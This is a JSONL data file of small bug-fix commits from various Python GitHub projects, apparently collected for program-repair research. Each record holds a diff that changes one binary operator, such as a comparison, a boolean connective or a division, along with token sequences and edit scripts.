{"project": "puzzle", "commit_sha": "c11bd870ee6f4a02b79ee5d1ed44f62ead05c3f1", "parent_sha": "9498acbde32378ba3395c8ff6afd558250015b08", "file_path": "woot/apps/expt/management/commands/step09_regions.py", "project_url": "https://github.com/NicholasPiano/puzzle", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -46,7 +46,7 @@ class Command(BaseCommand):\n \n           # 3. get or create gon only if path does not yet exist\n           t = int(file_dict['t'])\n-          if region_channel.paths.filter(t=t).count()>0:\n+          if region_channel.paths.filter(t=t).count()==0:\n             # make gon\n             gon = series.gons.create(experiment=series.experiment, composite=composite, channel=region_channel)\n             gon.set_origin(0,0,0,t)\n", "before": "if region_channel . paths . filter ( t = t ) . count ( ) > 0 : gon = series . gons . create ( experiment = series . experiment , composite = composite , channel = region_channel ) gon . set_origin ( 0 , 0 , 0 , t )", "after": "if region_channel . paths . filter ( t = t ) . count ( ) == 0 : gon = series . gons . create ( experiment = series . experiment , composite = composite , channel = region_channel ) gon . set_origin ( 0 , 0 , 0 , t )", "sstub_pattern": "CHANGE_BINARY_OPERATOR", "edit_script": "[[\"Insert\", [\"comparison_operator\", 3, 14, 3, 56], [\"==:==\", \"T\"], 1], [\"Delete\", [\">:>\", 3, 54, 3, 55]]]"}
{"project": "Algorithms-collections", "commit_sha": "ff0861b5b4443ebdc90d2f31ce85f4543524ae47", "parent_sha": "7b8b56da642f65672309db0c2f334e5d8f981cff", "file_path": "arrays/rotated_sorted_array.py", "project_url": "https://github.com/bkpathak/Algorithms-collections", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -25,7 +25,7 @@ def find_min_recursive(array, left, right):\n-    if array[left] < array[right]:\n+    if array[left] <= array[right]:\n         return array[left]\n     mid = left + (right - left) // 2\n     if array[mid] < array[right]:\n", "before": "if array [ left ] < array [ right ] : return array [ left ]", "after": "if array [ left ] <= array [ right ] : return array [ left ]", "sstub_pattern": "CHANGE_BINARY_OPERATOR", "edit_script": "[[\"Insert\", [\"comparison_operator\", 0, 8, 0, 34], [\"<=:<=\", \"T\"], 1], [\"Delete\", [\"<:<\", 0, 20, 0, 21]]]"}
{"project": "arc", "commit_sha": "612400a2851e5745e7edb2ec30e49d4033e95a1c", "parent_sha": "1a23c9dfb61170e1a4a64c20665b21ceb8dd7e1b", "file_path": "arc/cli/args/parser.py", "project_url": "https://github.com/autotest/arc", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -210,7 +210,7 @@ class Parser(argparse.ArgumentParser):\n             if module.ARGUMENTS:\n                 for arg in module.ARGUMENTS:\n                     # Add config instance to the options\n-                    if arg[1].get('config', None) == True:\n+                    if arg[1].get('config', None) is True:\n                         arg[1]['config'] = self.config\n                     # Support either both short+long options or either one, short OR long\n                     short_and_or_long_opts = arg[0]\n", "before": "if arg [ 1 ] . get ( 'config' , None ) == True : arg [ 1 ] [ 'config' ] = self . config", "after": "if arg [ 1 ] . get ( 'config' , None ) is True : arg [ 1 ] [ 'config' ] = self . config", "sstub_pattern": "CHANGE_BINARY_OPERATOR", "edit_script": "[[\"Insert\", [\"comparison_operator\", 3, 24, 3, 58], [\"is:is\", \"T\"], 1], [\"Delete\", [\"==:==\", 3, 51, 3, 53]]]"}
{"project": "upay-legacy", "commit_sha": "d5ac2ebb26420bef72111d5a3133068f37f2f081", "parent_sha": "5cdd9514579ce41e5bcc50c42fdfc36bad37e9c7", "file_path": "lib/upay/checkout.py", "project_url": "https://github.com/muccc/upay-legacy", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -64,7 +64,7 @@ class Checkout(threading.Thread):\n             time.sleep(0.01)\n \n         assets = self.token.assets(priceline)\n-        if assets == 0:\n+        if assets < 0:\n             self.report('Not enough credits!', 3)\n             return\n         \n", "before": "if assets == 0 : self . report ( 'Not enough credits!' , 3 ) return", "after": "if assets < 0 : self . report ( 'Not enough credits!' , 3 ) return", "sstub_pattern": "CHANGE_BINARY_OPERATOR", "edit_script": "[[\"Insert\", [\"comparison_operator\", 3, 12, 3, 23], [\"<:<\", \"T\"], 1], [\"Delete\", [\"==:==\", 3, 19, 3, 21]]]"}
{"project": "zipline", "commit_sha": "c09d501fbfa9e3320f5a9f0fff239db8d68d6f83", "parent_sha": "ad081645820d8d0f877e197d71d4f18bd99da14b", "file_path": "zipline/sources/simulated.py", "project_url": "https://github.com/infsum/zipline", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -122,7 +122,7 @@ class RandomWalkSource(DataSource):\n             current_dt = copy(open_dt)\n             if self.freq == 'minute':\n                 # Emit minutely trade signals from open to close\n-                while current_dt < close_dt:\n+                while current_dt <= close_dt:\n                     for event in self._gen_events(cur_prices, current_dt):\n                         yield event\n                     current_dt += timedelta(minutes=1)\n", "before": "while current_dt < close_dt : for event in self . _gen_events ( cur_prices , current_dt ) : yield event current_dt += timedelta ( minutes = 1 )", "after": "while current_dt <= close_dt : for event in self . _gen_events ( cur_prices , current_dt ) : yield event current_dt += timedelta ( minutes = 1 )", "sstub_pattern": "CHANGE_BINARY_OPERATOR", "edit_script": "[[\"Insert\", [\"comparison_operator\", 3, 23, 3, 44], [\"<=:<=\", \"T\"], 1], [\"Delete\", [\"<:<\", 3, 34, 3, 35]]]"}
{"project": "text_classification", "commit_sha": "1c784d7eb80136bae50f67a9cd3b4e3ce0469eab", "parent_sha": "ea42e0e4b5e21d8181b5cbf4d6817db9134fcf58", "file_path": "a03_TextRNN/p8_TextRNN_model.py", "project_url": "https://github.com/bigdong89/text_classification", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -56,7 +56,7 @@ class TextRNN:\n         lstm_bw_cell=rnn.BasicLSTMCell(self.hidden_size) #backward direction cell\n         if self.dropout_keep_prob is not None:\n             lstm_fw_cell=rnn.DropoutWrapper(lstm_fw_cell,output_keep_prob=self.dropout_keep_prob)\n-            lstm_bw_cell==rnn.DropoutWrapper(lstm_bw_cell,output_keep_prob=self.dropout_keep_prob)\n+            lstm_bw_cell=rnn.DropoutWrapper(lstm_bw_cell,output_keep_prob=self.dropout_keep_prob)\n         # bidirectional_dynamic_rnn: input: [batch_size, max_time, input_size]\n         #                            output: A tuple (outputs, output_states)\n", "before": "lstm_bw_cell == rnn . DropoutWrapper ( lstm_bw_cell , output_keep_prob = self . dropout_keep_prob )", "after": "lstm_bw_cell = rnn . DropoutWrapper ( lstm_bw_cell , output_keep_prob = self . dropout_keep_prob )", "sstub_pattern": "CHANGE_BINARY_OPERATOR", "edit_script": "[[\"Insert\", [\"expression_statement\", 3, 13, 3, 99], [\"assignment\", \"N0\"], 0], [\"Move\", \"N0\", [\"identifier:lstm_bw_cell\", 3, 13, 3, 25], 0], [\"Insert\", \"N0\", [\"=:=\", \"T\"], 1], [\"Move\", \"N0\", [\"call\", 3, 27, 3, 99], 2], [\"Delete\", [\"==:==\", 3, 25, 3, 27]], [\"Delete\", [\"comparison_operator\", 3, 13, 3, 99]]]"}
{"project": "NDN3", "commit_sha": "2b70659817abc71c2f038102bedcba9b769bd13a", "parent_sha": "a27e19fea7b9d70d6895fa5612e75d2dd2bb348d", "file_path": "NDN.py", "project_url": "https://github.com/NeuroTheoryUMD/NDN3", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -2500,7 +2500,7 @@ class NDN(object):\n             if np.sum(self.network_list[nn]['time_expand']) > 0:\n                 for ll in range(len(self.networks[nn].layers)):\n                     if (self.network_list[nn]['time_expand'][ll] > 0) and \\\n-                            ((self.network_list[nn]['layer_types'][ll] != 'temporal') or \\\n+                            ((self.network_list[nn]['layer_types'][ll] != 'temporal') and \\\n                                 (self.network_list[nn]['layer_types'][ll] != 'sp_temporal')):\n                         can_we = False\n         return can_we\n", "before": "if ( self . network_list [ nn ] [ 'time_expand' ] [ ll ] > 0 ) and ( ( self . network_list [ nn ] [ 'layer_types' ] [ ll ] != 'temporal' ) or ( self . network_list [ nn ] [ 'layer_types' ] [ ll ] != 'sp_temporal' ) ) : can_we = False", "after": "if ( self . network_list [ nn ] [ 'time_expand' ] [ ll ] > 0 ) and ( ( self . network_list [ nn ] [ 'layer_types' ] [ ll ] != 'temporal' ) and ( self . network_list [ nn ] [ 'layer_types' ] [ ll ] != 'sp_temporal' ) ) : can_we = False", "sstub_pattern": "CHANGE_BINARY_OPERATOR", "edit_script": "[[\"Insert\", [\"boolean_operator\", 3, 30, 4, 92], [\"and:and\", \"T\"], 1], [\"Delete\", [\"or:or\", 3, 87, 3, 89]]]"}
{"project": "python-github-api", "commit_sha": "4129560af2173c812df419cc8ee02ad8fdeb7050", "parent_sha": "acc40f1f5f04eb2253d6625698b5a06ea95e5ba9", "file_path": "Lib/distutils/command/install_data.py", "project_url": "https://github.com/jpr-hook/python-github-api", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -48,7 +48,7 @@ class install_data (Command):\n     def run (self):\n         self.mkpath(self.install_dir)\n         for f in self.data_files:\n-            if type(f) == StringType:\n+            if type(f) is StringType:\n                 # it's a simple file, so copy it\n                 f = convert_path(f)\n                 if self.warn_dir:\n", "before": "if type ( f ) == StringType : f = convert_path ( f ) if self . warn_dir : ", "after": "if type ( f ) is StringType : f = convert_path ( f ) if self . warn_dir : ", "sstub_pattern": "CHANGE_BINARY_OPERATOR", "edit_script": "[[\"Insert\", [\"comparison_operator\", 3, 16, 3, 37], [\"is:is\", \"T\"], 1], [\"Delete\", [\"==:==\", 3, 24, 3, 26]]]"}
{"project": "erpnext", "commit_sha": "2c404cf34fcf4002b81d37e2e0fcda469a72c8bd", "parent_sha": "6c698e19cac8cd59aa2b1f884b93631a2774a215", "file_path": "erpnext/manufacturing/doctype/bom/bom.py", "project_url": "https://github.com/indautgrp/erpnext", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -420,7 +420,7 @@ def validate_bom_no(item, bom_no):\n \tbom = frappe.get_doc(\"BOM\", bom_no)\n \tif not bom.is_active:\n \t\tfrappe.throw(_(\"BOM {0} must be active\").format(bom_no))\n-\tif not bom.docstatus!=1:\n+\tif not bom.docstatus == 1:\n \t\tif not getattr(frappe.flags, \"in_test\", False):\n \t\t\tfrappe.throw(_(\"BOM {0} must be submitted\").format(bom_no))\n \tif item and not (bom.item == item or \\\n", "before": "if not bom . docstatus != 1 : if not getattr ( frappe . flags , \"in_test\" , False ) : frappe . throw ( _ ( \"BOM {0} must be submitted\" ) . format ( bom_no ) )", "after": "if not bom . docstatus == 1 : if not getattr ( frappe . flags , \"in_test\" , False ) : frappe . throw ( _ ( \"BOM {0} must be submitted\" ) . format ( bom_no ) )", "sstub_pattern": "CHANGE_BINARY_OPERATOR", "edit_script": "[[\"Insert\", [\"comparison_operator\", 3, 9, 3, 25], [\"==:==\", \"T\"], 1], [\"Delete\", [\"!=:!=\", 3, 22, 3, 24]]]"}
{"project": "erpnext", "commit_sha": "b5c552faf3c161cddfd9e976ac36b135e63aaae9", "parent_sha": "dec02340e89d1b01f9734359f1673aa190d21b91", "file_path": "erpnext/accounts/doctype/account/account.py", "project_url": "https://github.com/indautgrp/erpnext", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -53,7 +53,7 @@ class Account(Document):\n \t\t\tif par[\"report_type\"]:\n \t\t\t\tself.report_type = par[\"report_type\"]\n \t\t\tif par[\"root_type\"]:\n-\t\t\t\tself.root_type - par[\"root_type\"]\n+\t\t\t\tself.root_type = par[\"root_type\"]\n \n \tdef validate_root_details(self):\n \t\t#does not exists parent\n", "before": "self . root_type - par [ \"root_type\" ]", "after": "self . root_type = par [ \"root_type\" ]", "sstub_pattern": "CHANGE_BINARY_OPERATOR", "edit_script": "[[\"Insert\", [\"expression_statement\", 3, 5, 3, 38], [\"assignment\", \"N0\"], 0], [\"Move\", \"N0\", [\"attribute\", 3, 5, 3, 19], 0], [\"Insert\", \"N0\", [\"=:=\", \"T\"], 1], [\"Move\", \"N0\", [\"subscript\", 3, 22, 3, 38], 2], [\"Delete\", [\"-:-\", 3, 20, 3, 21]], [\"Delete\", [\"binary_operator\", 3, 5, 3, 38]]]"}
{"project": "mustikkaBot", "commit_sha": "0f8d1bc75a4763cd2e03731ccbfaf8838ab741ae", "parent_sha": "039dad517d570f67730c7ad0a44f666c1532996c", "file_path": "src/accessmanager.py", "project_url": "https://github.com/varesa/mustikkaBot", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -339,7 +339,7 @@ class AccessManager:\n         if not acl in self.acls.keys():\n             raise Exception(\"ACL does not exist\")\n \n-        if user is 'cli':\n+        if user == 'cli':\n             return True                                             # Give local users all permissions\n \n         if user in self.get_group(\"%owner\").get_members():          # Always allow owner\n", "before": "if user is 'cli' : return True", "after": "if user == 'cli' : return True", "sstub_pattern": "CHANGE_BINARY_OPERATOR", "edit_script": "[[\"Insert\", [\"comparison_operator\", 3, 12, 3, 25], [\"==:==\", \"T\"], 1], [\"Delete\", [\"is:is\", 3, 17, 3, 19]]]"}
{"project": "osf.io", "commit_sha": "a7dce3dad6f7880f9b8d8b4ae38d752ec49bdb29", "parent_sha": "1509c41e506fb4251efe5547b3457583bac83019", "file_path": "website/addons/figshare/views/config.py", "project_url": "https://github.com/Vhoakab84/osf.io", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -29,7 +29,7 @@ def figshare_set_config(*args, **kwargs):\n     except:\n         raise HTTPError(http.BAD_REQUEST)\n \n-    if not figshare_id and not (figshare_type == 'project' or figshare_type == 'fileset'):\n+    if not figshare_id or not (figshare_type == 'project' or figshare_type == 'fileset'):\n         raise HTTPError(http.BAD_REQUEST)\n \n     changed = (\n", "before": "if not figshare_id and not ( figshare_type == 'project' or figshare_type == 'fileset' ) : raise HTTPError ( http . BAD_REQUEST )", "after": "if not figshare_id or not ( figshare_type == 'project' or figshare_type == 'fileset' ) : raise HTTPError ( http . BAD_REQUEST )", "sstub_pattern": "CHANGE_BINARY_OPERATOR", "edit_script": "[[\"Insert\", [\"boolean_operator\", 3, 12, 3, 90], [\"or:or\", \"T\"], 1], [\"Delete\", [\"and:and\", 3, 24, 3, 27]]]"}
{"project": "bpython", "commit_sha": "9e8cf1ccdc1b2672baa0467971380b0731e758b1", "parent_sha": "89f73ea368c787ef99f79af116fd9025e59ba18d", "file_path": "bpython/scrollfrontend/repl.py", "project_url": "https://github.com/thomasballinger/bpython", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -685,7 +685,7 @@ class Repl(BpythonRepl):\n                                        # extra character for space for the cursor\n         cursor_row = current_line_start_row + len(lines) - 1\n         if self.stdin.has_focus:\n-            cursor_column = len(self.current_stdouterr_line) - self.stdin.cursor_offset_in_line\n+            cursor_column = len(self.current_stdouterr_line) + self.stdin.cursor_offset_in_line\n             assert cursor_column >= 0, cursor_column\n         elif self.coderunner.running:\n             cursor_column = len(self.current_cursor_line) + self.cursor_offset_in_line\n", "before": "cursor_column = len ( self . current_stdouterr_line ) - self . stdin . cursor_offset_in_line", "after": "cursor_column = len ( self . current_stdouterr_line ) + self . stdin . cursor_offset_in_line", "sstub_pattern": "CHANGE_BINARY_OPERATOR", "edit_script": "[[\"Insert\", [\"binary_operator\", 3, 29, 3, 96], [\"+:+\", \"T\"], 1], [\"Delete\", [\"-:-\", 3, 62, 3, 63]]]"}
{"project": "patchwork", "commit_sha": "8904a7dcaf959da8db4a9a5d92b91a61eed05201", "parent_sha": "a5d803a565aea5b655058ff244e9ae8356004963", "file_path": "apps/patchwork/tests/test_notifications.py", "project_url": "https://github.com/moto-timo/patchwork", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -103,7 +103,7 @@ class PatchNotificationModelTest(TestCase):\n         self.assertEqual(PatchChangeNotification.objects.count(), 1)\n         notification = PatchChangeNotification.objects.all()[0]\n         self.assertEqual(notification.orig_state, oldstate)\n-        self.assertTrue(notification.last_modified > orig_timestamp)\n+        self.assertTrue(notification.last_modified >= orig_timestamp)\n \n     def testProjectNotificationsDisabled(self):\n", "before": "self . assertTrue ( notification . last_modified > orig_timestamp )", "after": "self . assertTrue ( notification . last_modified >= orig_timestamp )", "sstub_pattern": "CHANGE_BINARY_OPERATOR", "edit_script": "[[\"Insert\", [\"comparison_operator\", 3, 25, 3, 68], [\">=:>=\", \"T\"], 1], [\"Delete\", [\">:>\", 3, 52, 3, 53]]]"}
{"project": "plugin.video.maxdome", "commit_sha": "8280ef235934a36bbae342723173f44c719b76a0", "parent_sha": "eb1a1ea6c464ad3ae53f0239fb0c22e2b9e20176", "file_path": "navigation.py", "project_url": "https://github.com/frankr612/plugin.video.maxdome", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -426,7 +426,7 @@ class Navigation:\n             else:\n                 return False\n \n-        if asset_class != 'movie' or asset_class != 'tvepisode':\n+        if asset_class != 'movie' and asset_class != 'tvepisode':\n             return False\n \n         if self.mxd.Assets.orderAsset(assetid):\n", "before": "if asset_class != 'movie' or asset_class != 'tvepisode' : return False", "after": "if asset_class != 'movie' and asset_class != 'tvepisode' : return False", "sstub_pattern": "CHANGE_BINARY_OPERATOR", "edit_script": "[[\"Insert\", [\"boolean_operator\", 3, 12, 3, 64], [\"and:and\", \"T\"], 1], [\"Delete\", [\"or:or\", 3, 35, 3, 37]]]"}
{"project": "PyGame-Side-Collisions", "commit_sha": "37218ec7b8944617948df9027659435ec57c7a69", "parent_sha": "14efc505b959d31e5a382413d2f03cb1a2171e3e", "file_path": "side_collisions.py", "project_url": "https://github.com/DeathMiner/PyGame-Side-Collisions", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -148,7 +148,7 @@ def bottom(A, B):\n \t\t   A.rect.collidepoint(B.rect.topright) == True):\n \n \t\t    # Check if B velocity moves to the bottom\n-\t\t\tif B.velocity.y < 0:\n+\t\t\tif B.velocity.y > 0:\n \t\t\t\treturn True\n \n \t# Instead return False        \n", "before": "if B . velocity . y < 0 : return True", "after": "if B . velocity . y > 0 : return True", "sstub_pattern": "CHANGE_BINARY_OPERATOR", "edit_script": "[[\"Insert\", [\"comparison_operator\", 3, 7, 3, 23], [\">:>\", \"T\"], 1], [\"Delete\", [\"<:<\", 3, 20, 3, 21]]]"}
{"project": "sparkmagic", "commit_sha": "38a30b294b39f46f8087237c37b6ca88fe86e030", "parent_sha": "36ad901cc9d57a8f3ec2256e65447d21b138e438", "file_path": "remotespark/livyclientlib/altairviewer.py", "project_url": "https://github.com/jeffersonezra/sparkmagic", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -12,7 +12,7 @@ class AltairViewer(object):\n \n     \"\"\"A viewer that returns results as they are.\"\"\"\n     def visualize(self, result, chart_type=\"area\"):\n-        if type(result) == pd.DataFrame:\n+        if type(result) is pd.DataFrame:\n             columns = result.columns.values\n \n             # Simply return dataframe if only 1 column is available\n", "before": "if type ( result ) == pd . DataFrame : columns = result . columns . values", "after": "if type ( result ) is pd . DataFrame : columns = result . columns . values", "sstub_pattern": "CHANGE_BINARY_OPERATOR", "edit_script": "[[\"Insert\", [\"comparison_operator\", 3, 12, 3, 40], [\"is:is\", \"T\"], 1], [\"Delete\", [\"==:==\", 3, 25, 3, 27]]]"}
{"project": "keystone", "commit_sha": "f54fa8fa56d3708d5ef5b0173d9f6e4dce7130f2", "parent_sha": "db291b340e63b74d8d240abfc37d03fb163f33f1", "file_path": "keystone/token/persistence/backends/sql.py", "project_url": "https://github.com/theresoft/keystone", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -269,7 +269,7 @@ class Token(token.persistence.Driver):\n         total_removed = 0\n         upper_bound_func = timeutils.utcnow\n         for expiry_time in expiry_range_func(session, upper_bound_func):\n-            delete_query = query.filter(TokenModel.expires <\n+            delete_query = query.filter(TokenModel.expires <=\n                                         expiry_time)\n             row_count = delete_query.delete(synchronize_session=False)\n             total_removed += row_count\n", "before": "delete_query = query . filter ( TokenModel . expires < expiry_time )", "after": "delete_query = query . filter ( TokenModel . expires <= expiry_time )", "sstub_pattern": "CHANGE_BINARY_OPERATOR", "edit_script": "[[\"Insert\", [\"comparison_operator\", 3, 41, 4, 52], [\"<=:<=\", \"T\"], 1], [\"Delete\", [\"<:<\", 3, 60, 3, 61]]]"}
{"project": "Python", "commit_sha": "840aa6209b674a00dce1ea90734e98a7d3e4e7fe", "parent_sha": "8a667e8b22075652945f88d7e85b38d25e3a282b", "file_path": "data_structures/heap/heap.py", "project_url": "https://github.com/TaylorQueen/Python", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -40,7 +40,7 @@ class Heap:\n \tdef buildHeap(self,a):\n \t\tself.currsize = len(a)\n \t\tself.h = list(a)\n-\t\tfor i in range(self.currsize/2,-1,-1):\n+\t\tfor i in range(self.currsize//2,-1,-1):\n \t\t\tself.maxHeapify(i)\n \n \tdef getMax(self):\n", "before": "for i in range ( self . currsize / 2 , - 1 , - 1 ) : self . maxHeapify ( i )", "after": "for i in range ( self . currsize // 2 , - 1 , - 1 ) : self . maxHeapify ( i )", "sstub_pattern": "CHANGE_BINARY_OPERATOR", "edit_script": "[[\"Insert\", [\"binary_operator\", 3, 18, 3, 33], [\"//://\", \"T\"], 1], [\"Delete\", [\"/:/\", 3, 31, 3, 32]]]"}
{"project": "picard", "commit_sha": "0b4bfcfc8851b5497403b86e1eb9d47135ac69b1", "parent_sha": "f8b8c7451e8be43039e8df187ad60fb770d43de4", "file_path": "picard/file.py", "project_url": "https://github.com/phw/picard", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -175,7 +175,7 @@ class File(QtCore.QObject, Item):\n             from picard.formats.util import guess_format\n             # If it fails, force format guessing and try loading again\n             file_format = guess_format(filename)\n-            if not file_format and type(file_format) == type(self):\n+            if not file_format or type(file_format) == type(self):\n                 raise\n             return file_format._load(filename)\n \n", "before": "if not file_format and type ( file_format ) == type ( self ) : raise", "after": "if not file_format or type ( file_format ) == type ( self ) : raise", "sstub_pattern": "CHANGE_BINARY_OPERATOR", "edit_script": "[[\"Insert\", [\"boolean_operator\", 3, 20, 3, 67], [\"or:or\", \"T\"], 1], [\"Delete\", [\"and:and\", 3, 32, 3, 35]]]"}
{"project": "agx.generator.pyramid", "commit_sha": "a6967f35649dad750bfe3a25859bcabfca57e3f0", "parent_sha": "7b557551b77e6bb495c4e992f641396a538fdc21", "file_path": "src/agx/generator/pyramid/scope.py", "project_url": "https://github.com/bluedynamics/agx.generator.pyramid", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -75,6 +75,6 @@ registerScope('sqlalchemy_package', 'uml2fs', [IPackage], sqlalchemy_package)\n class i18_egg(Scope):\n \n     def __call__(self, node):\n-        return node.stereotype('pyramid:i18n') is not None or node.stereotype('pyegg:pyegg') is not None\n+        return node.stereotype('pyramid:i18n') is not None and node.stereotype('pyegg:pyegg') is not None\n \n registerScope('i18_egg', 'uml2fs', [IPackage], i18_egg)\n\\ No newline at end of file\n", "before": "return node . stereotype ( 'pyramid:i18n' ) is not None or node . stereotype ( 'pyegg:pyegg' ) is not None", "after": "return node . stereotype ( 'pyramid:i18n' ) is not None and node . stereotype ( 'pyegg:pyegg' ) is not None", "sstub_pattern": "CHANGE_BINARY_OPERATOR", "edit_script": "[[\"Insert\", [\"boolean_operator\", 3, 16, 3, 105], [\"and:and\", \"T\"], 1], [\"Delete\", [\"or:or\", 3, 60, 3, 62]]]"}
{"project": "anaconda-build", "commit_sha": "d314bb1b51401b8df7dd188906934a4c9920dd25", "parent_sha": "263d7fbacb8c54cd21c6058c8df24a4122194bc1", "file_path": "binstar_build_client/worker/tests/test_build_script.py", "project_url": "https://github.com/Anaconda-Platform/anaconda-build", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -252,7 +252,7 @@ class Test(unittest.TestCase):\n         proc = Popen(exe + [os.path.abspath(script_name)], stdout=PIPE, stderr=STDOUT, cwd='.')\n         output = proc.stdout.read().splitlines()\n         npy = len([line for line in output if 'CONDA_NPY=' in line])\n-        self.assertTrue(npy > 1)\n+        self.assertTrue(npy >= 1)\n \n     def test_env_envvars(self):\n         'Test env or envvars can be used in .binstar.yml'\n", "before": "self . assertTrue ( npy > 1 )", "after": "self . assertTrue ( npy >= 1 )", "sstub_pattern": "CHANGE_BINARY_OPERATOR", "edit_script": "[[\"Insert\", [\"comparison_operator\", 3, 25, 3, 32], [\">=:>=\", \"T\"], 1], [\"Delete\", [\">:>\", 3, 29, 3, 30]]]"}
{"project": "PROM", "commit_sha": "ba05d167d67cf9a73233580f4f3aec90768e6e3e", "parent_sha": "da4a4b6a12e767c1b000b2e4a5abfe775fc47e1f", "file_path": "ponggame.py", "project_url": "https://github.com/Irenes186/PROM", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -73,7 +73,7 @@ def update_game():\n     if ball.position.x == bat1.position.x + 1 and ball.velocity.x < 0:\n         if ball.position.y >= bat1.position.y and ball.position.y <= (bat1.position.y + bat1.length):\n             ball.velocity.x *= -1\n-    elif ball.position.x == bat2.position.x - 1 and ball.velocity.x < 0:\n+    elif ball.position.x == bat2.position.x - 1 and ball.velocity.x > 0:\n         if ball.position.y >= bat2.position.y and ball.position.y <= (bat2.position.y + bat2.length):\n             ball.velocity.x *= -1\n \n", "before": "if ball . position . x == bat1 . position . x + 1 and ball . velocity . x < 0 : if ball . position . y >= bat1 . position . y and ball . position . y <= ( bat1 . position . y + bat1 . length ) : ball . velocity . x *= - 1 elif ball . position . x == bat2 . position . x - 1 and ball . velocity . x < 0 : if ball . position . y >= bat2 . position . y and ball . position . y <= ( bat2 . position . y + bat2 . length ) : ball . velocity . x *= - 1", "after": "if ball . position . x == bat1 . position . x + 1 and ball . velocity . x < 0 : if ball . position . y >= bat1 . position . y and ball . position . y <= ( bat1 . position . y + bat1 . length ) : ball . velocity . x *= - 1 elif ball . position . x == bat2 . position . x - 1 and ball . velocity . x > 0 : if ball . position . y >= bat2 . position . y and ball . position . y <= ( bat2 . position . y + bat2 . length ) : ball . velocity . x *= - 1", "sstub_pattern": "CHANGE_BINARY_OPERATOR", "edit_script": "[[\"Insert\", [\"comparison_operator\", 3, 53, 3, 72], [\">:>\", \"T\"], 1], [\"Delete\", [\"<:<\", 3, 69, 3, 70]]]"}
{"project": "revizor-tests", "commit_sha": "e77d7d60f85138df657806b5120c67990debf99b", "parent_sha": "be2725c7cadf838e427b10d77fd1128933a15b06", "file_path": "functional/lifecycle/steps/scripting_steps.py", "project_url": "https://github.com/Scalr/revizor-tests", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -116,6 +116,6 @@ def chef_bootstrap_failed(step, serv_as):\n     server = getattr(world, serv_as)\n     node = world.cloud.get_node(server)\n     out = node.run('tail -n 50 /var/log/scalarizr_debug.log')[0]\n-    if \"001-chef.bootstrap/bin/chef.sh']] exited with code 1\" not in out or \\\n+    if \"001-chef.bootstrap/bin/chef.sh']] exited with code 1\" not in out and \\\n         \"Command /usr/bin/chef-client exited with code 1\" not in out:\n         raise AssertionError(\"Chef bootstrap markers not found in scalarizr_debug.log\")\n", "before": "if \"001-chef.bootstrap/bin/chef.sh']] exited with code 1\" not in out or \"Command /usr/bin/chef-client exited with code 1\" not in out : raise AssertionError ( \"Chef bootstrap markers not found in scalarizr_debug.log\" )", "after": "if \"001-chef.bootstrap/bin/chef.sh']] exited with code 1\" not in out and \"Command /usr/bin/chef-client exited with code 1\" not in out : raise AssertionError ( \"Chef bootstrap markers not found in scalarizr_debug.log\" )", "sstub_pattern": "CHANGE_BINARY_OPERATOR", "edit_script": "[[\"Insert\", [\"boolean_operator\", 3, 8, 4, 69], [\"and:and\", \"T\"], 1], [\"Delete\", [\"or:or\", 3, 74, 3, 76]]]"}
{"project": "redirect", "commit_sha": "6fe7db0e18a82863ab74976ac14cd8afb3b18fdb", "parent_sha": "b1de86f21b524736aeea51106e06ad60660dbd20", "file_path": "integration/verify.py", "project_url": "https://github.com/syncloud/redirect", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -197,7 +197,7 @@ def test_user_reset_password_set_new(domain):\n                              verify=False)\n     assert response.status_code == 200, response.text\n \n-    assert len(smtp.emails()) == 0, 'Server should send email when setting new password'\n+    assert len(smtp.emails()) > 0, 'Server should send email when setting new password'\n \n     response = requests.get('https://api.{0}/user/get'.format(domain),\n                             params={'email': email, 'password': new_password},\n", "before": "assert len ( smtp . emails ( ) ) == 0 , 'Server should send email when setting new password'", "after": "assert len ( smtp . emails ( ) ) > 0 , 'Server should send email when setting new password'", "sstub_pattern": "CHANGE_BINARY_OPERATOR", "edit_script": "[[\"Insert\", [\"comparison_operator\", 3, 12, 3, 35], [\">:>\", \"T\"], 1], [\"Delete\", [\"==:==\", 3, 31, 3, 33]]]"}
{"project": "donthackme_output", "commit_sha": "490bcd9d5b7a210bb1aaec80f59b1208ab33be1e", "parent_sha": "fd84baf50de933328945e22a952570766fe31c77", "file_path": "donthackme.py", "project_url": "https://github.com/donthack-me/donthackme_output", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -83,7 +83,7 @@ class Output(cowrie.core.output.Output):\n     def refresh_token(self):\n         \"\"\"If token is close to expiry, retrieve new.\"\"\"\n         if self.expires and \\\n-           self.expires < datetime.utcnow() + timedelta(minutes=10):\n+           self.expires > datetime.utcnow() + timedelta(minutes=10):\n             return\n \n         agent_string = \"Donthack.Me Cowrie Output Plugin v0.1, User: {0}\"\n", "before": "if self . expires and self . expires < datetime . utcnow ( ) + timedelta ( minutes = 10 ) : return", "after": "if self . expires and self . expires > datetime . utcnow ( ) + timedelta ( minutes = 10 ) : return", "sstub_pattern": "CHANGE_BINARY_OPERATOR", "edit_script": "[[\"Insert\", [\"comparison_operator\", 3, 12, 3, 68], [\">:>\", \"T\"], 1], [\"Delete\", [\"<:<\", 3, 25, 3, 26]]]"}
